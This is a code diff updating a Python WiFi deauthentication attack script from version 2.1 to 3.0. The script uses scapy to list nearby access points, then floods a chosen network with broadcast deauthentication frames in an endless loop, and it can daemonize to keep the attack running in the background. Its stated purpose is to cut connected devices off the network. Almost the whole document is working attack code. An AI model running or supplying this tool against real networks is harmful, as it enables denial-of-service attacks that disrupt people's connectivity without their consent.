@@ -4,21 +4,15 @@ Sends deauth packets to a wifi network which results network outage for connecte
 """
 __author__ ="Veerendra Kakumanu"
 __license__ = "Apache 2.0"
-__version__ = "2.1"
+__version__ = "3.0"
 __maintainer__ = "Veerendra Kakumanu"
 
-print "\n+---------------------------------------------------+"
-print "|Deauth v2.1                        		    |"
-print "|Coded by Veerendra                 		    |"
-print "|Blog: www.networkhop.wordpress.com 		    |"
-print "|https://github.com/veerendra2/wifi-deauth-attack   |"
-print "+---------------------------------------------------+\n\n"
-
 import os
-import threading
 import sys
 import re
 import logging
+import subprocess
+import argparse
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 try:
@@ -27,142 +21,177 @@ except:
     print "\n'scapy' module not found. Installing..."
     os.system("sudo apt-get install python-scapy -y")
     import scapy.all
-
 scapy.all.conf.verbose = False
+wireless_file="/proc/net/wireless"
+dev_file="/proc/net/dev"
+packet_count=2000
+patterns={"MAC Address" : 'Address:(.*)',
+          "ESSID"       : 'ESSID:(.*)',
+          "ID"          : '(.*) - Address'}
+def banner():
+    print "\n+---------------------------------------------------+"
+    print "|Deauth v3.0                        		    |"
+    print "|Coded by Veerendra Kakumanu                        |"
+    print "|Blog: www.networkhop.wordpress.com 		    |"
+    print "|https://github.com/veerendra2/wifi-deauth-attack   |"
+    print "+---------------------------------------------------+\n\n"
 
-class airmon(object):
-    def __new__(cls, *args,**kwargs):
-        mon_interface=list()
-        with open("/proc/net/dev","r") as f:
-            for line in f.readlines():
-                if re.search(r'mon[0-9]+',line):
-                    print "Found airmon-ng interface..",line.split(":")[0].strip()
-                    mon_interface.append(line.split(":")[0].strip())
-        if not mon_interface:
-            iface=findIface()
-            print "Starting monitoring interface on '{}'...".format(iface)
-            if os.system("airmon-ng start {}".format(iface))!=0:
-                print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
-                raise SystemExit() #Instance creation Aborted!
-            mon_interface.append("mon0")
-        new_instance=object.__new__(cls,*args,**kwargs)
-        setattr(new_instance, "mon_interfaces",mon_interface)
-        return new_instance #returns the instance, if there is mon0 interface
+def daemonize():
+    if os.fork():
+        os._exit(0)
+    os.chdir("/")
+    os.umask(022)
+    os.setsid()
+    os.umask(0)
+    if os.fork():
+        os._exit(0)
+    stdin = open(os.devnull)
+    stdout = open(os.devnull, 'w')
+    os.dup2(stdin.fileno(), 0)
+    os.dup2(stdout.fileno(), 1)
+    os.dup2(stdout.fileno(), 2)
+    stdin.close()
+    stdout.close()
+    os.umask(022)
+    for fd in xrange(3, 1024):
+        try:
+            os.close(fd)
+        except OSError:
+            pass
 
-def findIface():
+def create_interface():
     iface=None
-    wireless_file="/proc/net/wireless"
-    if os.path.exists(wireless_file):
-        with open(wireless_file,'r') as f:
-            for line in f.readlines():
-                if not re.search(r'Inter-',line) and not re.search(r'face',line):
-                    iface=line.split(":")[0]
-    if iface:
-        return iface.strip()
-    else:
-        iface=raw_input("Wireless interface not found.\nPlease specify wireless interface> ")
-        return iface
+    try:
+        with open(dev_file) as f:
+            return re.findall(r'(mon[0-9]+|wlan0mon)',f.read())[0]
+    except:
+        print "Monitoring interface not found. Attempting to start airmon-ng"
+        try:
+            with open(wireless_file) as f:
+                iface=re.findall(r'(.*):',f.read())[0].strip()
+        except:
+            iface=raw_input("Wireless interface not found.\nPlease enter wireless interface name> ").strip()
+        if os.system("airmon-ng start {} > /dev/null 2>&1".format(iface))!=0:
+            print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
+            exit(1)
+        with open(dev_file) as f:
+            return re.findall(r'(mon[0-9]+|wlan0mon)',f.read())[0]
 
 def spinner():
     while True:
         for cursor in '|/-\\':
             yield cursor
-
+spin=spinner()
 class sniffWifi(object):
-    def __new__(cls,*args,**kwargs):
-        mon=airmon() #Starting airmon-ng
-        return object.__new__(cls,*args,**kwargs) #returns the instance, IF there is mon0 interface
-
-    def __init__(self,pktlimit=2000):
+    def __init__(self,mon,pktlimit):
+        self.mon=mon
         self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
         self.ap_set=set()
         self.pktcount=0
         self.ssidcount=0
         self.pktlimit=pktlimit #Number of beacons should listen
-        self.test=spinner()
 
     def packetHandler(self,pkt):
         self.pktcount+=1
         if pkt.haslayer(scapy.all.Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in self.ap_set:
             self.ssidcount+=1
             self.ap_set.add(pkt.addr2)
-            self.ap_list.setdefault(self.ssidcount,[pkt.addr2,pkt.info])
+            self.ap_list.setdefault(str(self.ssidcount),[pkt.addr2,pkt.info])
 
     def stopFilter(self,x): #Stop the Sniffing if packet reachs the count
-        sys.stdout.write("\b{}".format(next(self.test)))
+        sys.stdout.write("\b{}".format(next(spin)))
         sys.stdout.flush()
-        if self.pktcount==self.pktlimit:
+        if self.pktlimit < self.pktcount:
             return True
         else:
             return False
 
     def runSniff(self): #Sniffing Here!
-        print "\nSniffing wifi signals, it will take some time. Please wait.....",
-        scapy.all.sniff(iface="mon0", prn = self.packetHandler, stop_filter=self.stopFilter)
+        print "\nMonitoring wifi signals, it will take some time. Please wait.....",
+        scapy.all.sniff(iface=self.mon, prn = self.packetHandler, stop_filter=self.stopFilter)
+        print "\n\n"
+        return self.ap_list
 
-class Deauth(threading.Thread):
-    def __init__(self,mac=None):
-        threading.Thread.__init__(self)
-        self.mac=mac
-        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()
 
-    def run(self):
-        while True:
-            print "Sending packet->",self.mac
-            scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
+
+def get_aplist():
+    result=None
+    ap=dict()
+    for x in range(3): #Sometimes it command is not running
+        if x==2:
+            print "iwlist is not working?"
+            exit(1)
+        try:
+            result=subprocess.check_output("iwlist wlan0 s",shell=True)
+            break
+        except:
+            continue
+    for name,pattern in patterns.items():
+        patterns[name]=re.compile(pattern)
+    for line in result.split("Cell"):
+        if line and "Scan completed" not in line:
+            mac=patterns["MAC Address"].findall(line)[0].strip()
+            ssid=patterns["ESSID"].findall(line)[0].strip('"')
+            ids=int(patterns["ID"].findall(line)[0].strip())
+            ap.setdefault(ids,[mac,ssid])
+    return ap
+
+def send_deauth(mac,mon):
+    pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac[0],addr3=mac[0])/scapy.all.Dot11Deauth()
+    print "\nSending Deauthication Packets to -> "+mac[1]
+    while True:
+        sys.stdout.write("\b{}".format(next(spin)))
+        sys.stdout.flush()
+        scapy.all.sendp(pkt, iface=mon,count=1, inter=.2, verbose=0)
+
+def render_ouput(ap):
+    if not ap:
+        print "Wifi hotspots not found near by you."
+        exit(1)
+    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
+    print "| ID".ljust(5," ")+"|"+"     Wifi Hotspot Name     "+"|"+"    MAC Address    |"
+    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
+    for id, ssid in ap.items():
+        print "|",str(id).ljust(3," ")+"|",ssid[1].ljust(26," ")+"|",ssid[0].ljust(17," ")+" |"
+    print "+".ljust(5,"-")+"+".ljust(28,"-")+"+".ljust(20,"-")+"+"
+    while 1:
+        try:
+            res=raw_input("\nChoose ID>>")
+            if res in ap:
+                break
+        except: pass
+        print "Invalid option. Please try again"
+    return ap[res]
 
 if __name__=='__main__':
     if not os.geteuid() == 0:
         print "[ERROR]".ljust(8," "),"Script must run with 'sudo'"
-        print "Usage: sudo python deauth.py [MAC or all]"
-        exit()
-    try:
-        input=os.environ["DEAUTH"] #Starting with Environmental variable `export DEAUTH=<MAC>`
-        if re.search(r'(?:[0-9a-fA-F]:?){12}',os.environ["DEAUTH"]):
-            print "Got the MAC address from environmental variable!"
-            mon=airmon()
-            Deauth(input).start()
-        else:
-            print "Incorrect MAC address formate in environmental variable"
-            raise ValueError
-    except: # Environmental variable was not set or MAC address was not in corrent format
-        if len(sys.argv)==1: # No command line argument
-            ap=dict()
-            sniff=sniffWifi()
-            sniff.runSniff()
-            while True:
-                try:
-                    print "\n\n","0".ljust(2," "),"Sends deauth packets to every network which are given below"
-                    for id, ssid in sniff.ap_list.iteritems():
-                        print str(id).ljust(2," "),ssid[0].ljust(20," "),ssid[1]
-                    x=int(raw_input(">>"))
-                    if x==0:
-                        for id,mac in sniff.ap_list.iteritems():
-                            Deauth(mac[0]).start() #Multi Threading Here
-                        break
-                    elif x in sniff.ap_list:
-                        Deauth(sniff.ap_list[x][0]).start()
-                        break
-                    else:
-                        print "Please enter valid option.\n"
-                except:
-                    print "Please enter valid option.\n"
-                    continue
-
-        elif len(sys.argv)==2:
-            input=sys.argv[1]
-            if input=="all":
-                sniff=sniffWifi()
-                sniff.runSniff()
-                for id,mac in sniff.ap_list.iteritems():
-                    Deauth(mac[0]).start() #Multi Threading Here
-            elif re.search(r'(?:[0-9a-fA-F]:?){12}',input):
-                mon=airmon()
-                Deauth(input).start()
-            else:
-                print "Incorrect MAC address formate!\nUsage: sudo python deauth.py [MAC or all]"
-                sys.exit()
-
-        elif len(sys.argv)>2:
-            print "Usage: sudo python deauth.py [MAC or all]"
-            sys.exit()
+        print "For Help: sudo python deauth.py -h"
+        exit(1)
+    parser = argparse.ArgumentParser(description='Sends deauthentication packets to a wifi network which results network outage for connected devices.  [Coded by VEERENDRA KAKUMANU]')
+    parser.add_argument('-d', action='store_true', dest='daemon', default=False ,help='Run as daemon')
+    parser.add_argument('-c', action='store', dest='count',help='Stops the monitoring after this count reachs.By default it is 2000')
+    parser.add_argument('-m', action='store', dest='mac',help='Sends deauth packets to this network')
+    parser.add_argument('-v', action='version', version='%(prog)s 3.0')
+    results=parser.parse_args()
+    banner()
+    if results.count:
+        packet_count=int(results.count)
+    mon=create_interface()
+    if results.mac:
+        if not re.search(r'(?:[0-9a-fA-F]:?){12}',results.mac.strip()):
+            print "Incorrect MAC address format. Please check",results.mac.strip()
+            exit(1)
+        if results.daemon:
+            print "\nRunning as daemon with pid",os.getpid()
+            print "If you want to kill the process, run'pkill -9 -f deauth.py'"
+            daemonize()
+        send_deauth([results.mac.strip(),"Unknown"],mon)
+    else:
+        sniff=sniffWifi(mon,packet_count)
+        wifi=render_ouput(sniff.runSniff())
+        if results.daemon:
+            print "\nRunning as daemon with pid",os.getpid()
+            print "If you want to kill the process, run 'pkill -9 -f deauth.py'"
+            daemonize()
+        send_deauth(wifi,mon)
